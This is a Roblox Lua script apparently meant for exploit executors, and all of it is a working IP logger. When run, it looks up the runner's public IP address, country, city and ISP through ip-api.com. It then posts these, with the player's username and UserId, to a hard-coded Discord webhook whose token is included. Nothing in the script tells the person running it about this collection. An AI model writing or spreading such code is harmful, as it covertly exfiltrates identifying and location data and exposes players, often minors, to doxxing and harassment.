local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1399356073114210377/SVJBBbI_gNGzAfpR26L_9NC3eXnZi3N5QBPIIp9t-8xOTL7_baPqKiC03AZRTZSAjNHU"

-- Use IP API to fetch location
local geoRequest = syn and syn.request or http_request or http and http.request
local locationData = {}

if geoRequest then
    local response = geoRequest({
        Url = "http://ip-api.com/json", -- IP geolocation service
        Method = "GET"
    })

    if response and response.Body then
        locationData = HttpService:JSONDecode(response.Body)
    end
end

-- Webhook Embed
local data = {
    username = "Script Execution Logger",
    embeds = {{
        title = "Script Executed",
        color = 16711680,
        fields = {
            {name = "Username", value = player.Name, inline = true},
            {name = "UserId", value = tostring(player.UserId), inline = true},
            {name = "Country", value = locationData.country or "Unknown", inline = true},
            {name = "City", value = locationData.city or "Unknown", inline = true},
            {name = "ISP", value = locationData.isp or "Unknown", inline = false},
            {name = "IP", value = locationData.query or "Hidden", inline = false},
            {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
        }
    }}
}

local jsonData = HttpService:JSONEncode(data)

local success, err = pcall(function()
    geoRequest({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end)

if success then
    print("Webhook sent with location!")
else
    warn("Failed to send webhook: ", err)
end

